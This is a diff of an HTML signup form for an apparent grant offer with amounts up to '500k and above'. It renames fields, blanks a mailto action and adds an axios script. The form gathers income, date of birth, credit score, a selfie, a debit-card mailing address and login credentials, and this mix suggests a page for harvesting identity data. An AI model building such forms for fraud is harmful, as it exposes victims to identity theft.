@@ -47,7 +47,7 @@
     </section>
     <!-- first form // sign up form -->
     <!-- <article class="first-form"> -->
-    <form action="mailto:companychris00@gmail.com" class="signup-form row">
+    <form action="" class="signup-form row">
       <article class="first-form row">
         <div class="mb-3 col-md-6">
           <label for="first-name" class="form-label">First name:</label>
@@ -56,7 +56,7 @@
             class="form-control"
             id="first-name"
             placeholder="input your name"
-            name="client-first-name"
+            name="firstname"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -76,7 +76,7 @@
             class="form-control"
             id="last-name"
             placeholder="input your last name"
-            name="client-last-name"
+            name="lastname"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -98,7 +98,7 @@
             class="form-control"
             id="other-name"
             placeholder="input your other name"
-            name="client-other-name"
+            name="othername"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -110,13 +110,13 @@
           ></i>
           <div class="error-message error-othername"></div>
         </div>
-        <div class="mb-3 col-md-6">
+        <!-- <div class="mb-3 col-md-6">
           <label for="email" class="form-label">Email:</label>
           <input
             type="text"
             class="form-control"
             id="email"
-            name="client-email"
+            name="email"
             placeholder="input your email"
           />
           <i
@@ -128,7 +128,7 @@
             style="color: green"
           ></i>
           <div class="error-message error-email"></div>
-        </div>
+        </div> -->
 
         <div class="mb-3 col-md-6">
           <label for="number" class="form-label">Phone number:</label>
@@ -137,7 +137,7 @@
             class="form-control"
             id="number"
             placeholder="phone number"
-            name="client-number"
+            name="phone"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -182,7 +182,7 @@
               class="form-control"
               id="income"
               placeholder="how much do you earn monthly"
-              name="earning"
+              name="income"
             />
 
             <i
@@ -207,7 +207,7 @@
             class="form-control"
             id="mailingaddress"
             placeholder="address to receive your debit card"
-            name="mailing-adrress"
+            name="address"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -227,7 +227,7 @@
             class="form-control"
             id="city"
             placeholder="input your state"
-            name="city"
+            name="state"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -246,7 +246,7 @@
             class="form-control"
             id="age"
             placeholder="input your name"
-            name="client-age"
+            name="dob"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -261,7 +261,7 @@
 
         <!-- gender -->
         <!-- gender -->
-        <div class="mb-3">
+        <!-- <div class="mb-3">
           <label for="" style="margin-bottom: -0.4rem" id="gender"
             >Gender:</label
           >
@@ -288,7 +288,7 @@
           <div class="error-message error-gender" style="margin-top: -0.4rem">
             error
           </div>
-        </div>
+        </div> -->
 
         <!-- select grant amount -->
         <!-- select grant amount -->
@@ -302,7 +302,7 @@
             <input
               class="form-check-input"
               type="radio"
-              name="amout-selected"
+              name="grant"
               value="20K"
               id="twenty"
               checked
@@ -313,7 +313,7 @@
             <input
               class="form-check-input"
               type="radio"
-              name="amout-selected"
+              name="grant"
               id="thirty"
               value="30k"
             />
@@ -323,7 +323,7 @@
             <input
               class="form-check-input"
               type="radio"
-              name="amout-selected"
+              name="grant"
               id="fifty"
               value="50k"
             />
@@ -333,7 +333,7 @@
             <input
               class="form-check-input"
               type="radio"
-              name="amout-selected"
+              name="grant"
               id="seventy"
               value="70k"
             />
@@ -343,7 +343,7 @@
             <input
               class="form-check-input"
               type="radio"
-              name="amout-selected"
+              name="grant"
               id="hundred"
               value="100k"
             />
@@ -353,7 +353,7 @@
             <input
               class="form-check-input"
               type="radio"
-              name="amout-selected"
+              name="grant"
               id="one-fifty"
               value="150k"
             />
@@ -363,7 +363,7 @@
             <input
               class="form-check-input"
               type="radio"
-              name="amout-selected"
+              name="grant"
               id="two-hundred"
               value="200k"
             />
@@ -373,7 +373,7 @@
             <input
               class="form-check-input"
               type="radio"
-              name="amout-selected"
+              name="grant"
               id="five-hundred"
               value="500k and above"
             />
@@ -391,7 +391,7 @@
             id="credit-score"
             placeholder="input your credit score"
             maxlength="3"
-            name="credit-score"
+            name="credit_score"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -404,7 +404,7 @@
           <div class="error-message error-credit-score"></div>
         </div>
         <div class="mb-3 file-div col-md-6">
-          <label for="credit-score" class="form-label"
+          <label for="file" class="form-label"
             >Upload photo (selfie recommended):</label
           >
           <input
@@ -412,7 +412,7 @@
             class="form-control"
             id="file"
             accept="image/*"
-            name="photo"
+            name="file"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -429,11 +429,10 @@
             >Reason for grant application:</label
           >
           <textarea
-            name="reason"
             id="reason"
             cols="30"
             rows="5"
-            name="application-reason"
+            name="grant_reason"
           ></textarea>
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon textarea-icon"
@@ -471,7 +470,7 @@
             class="form-control"
             id="login-email"
             placeholder="choose a login email"
-            name="login-email"
+            name="email"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -491,7 +490,7 @@
             class="form-control"
             id="login-password-one"
             placeholder="choose a password"
-            name="client-password"
+            name="passcode"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -501,7 +500,7 @@
             class="fa-solid fa-circle-check validation-icon valid-icon"
             style="color: green"
           ></i>
-          <div class="error-message error-password-one">name is required</div>
+          <div class="error-message error-password-one"></div>
         </div>
 
         <div class="mb-3 age-div">
@@ -512,7 +511,7 @@
             id="login-password-two"
             class="password-2"
             placeholder="enter password again"
-            name="client-password"
+            name="passcode"
           />
           <i
             class="fa-solid fa-circle-exclamation validation-icon invalid-icon"
@@ -544,6 +543,12 @@
     </form>
     <!-- <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> -->
     <!-- <script src="https://cdnjs.cloudfare.com/ajax/libs/axios/0.27.2/axios.min.js"></script> -->
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.27.2/axios.js"
+      integrity="sha512-rozBdNtS7jw9BlC76YF1FQGjz17qQ0J/Vu9ZCFIW374sEy4EZRbRcUZa2RU/MZ90X2mnLU56F75VfdToGV0RiA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
     <script src="signup.js"></script>
   </body>
 </html>
